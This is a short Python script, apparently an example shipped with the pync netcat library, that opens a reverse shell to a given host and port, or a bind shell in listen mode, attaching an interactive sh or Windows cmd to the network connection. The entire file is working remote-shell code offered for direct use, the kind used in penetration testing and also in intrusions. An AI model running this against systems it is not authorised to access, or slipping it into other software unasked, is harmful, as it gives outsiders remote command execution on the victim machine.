# -*- coding: utf-8 -*-
'''
A simple reverse or bind shell using pync.
'''

import argparse
import platform

from pync import Netcat


def main():
    parser = argparse.ArgumentParser('shell.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description=__doc__,
    )
    parser.add_argument('dest',
            help='Hostname or IP to connect to',
            metavar='DEST',
            nargs='?',
            default='',
    )
    parser.add_argument('port',
            help='Port number to connect to',
            metavar='PORT',
            type=int,
    )
    parser.add_argument('-l',
            help='Listen mode, for bind shell',
            action='store_true',
    )
    args = parser.parse_args()

    command = "PS1='$ ' sh -i"
    if platform.system() == 'Windows':
        command = 'cmd /q'

    nc = Netcat(args.port,
            dest=args.dest,
            e=command,
            l=args.l,
    )

    try:
        nc.run()
    finally:
        nc.close()


if __name__ == '__main__':
    main()

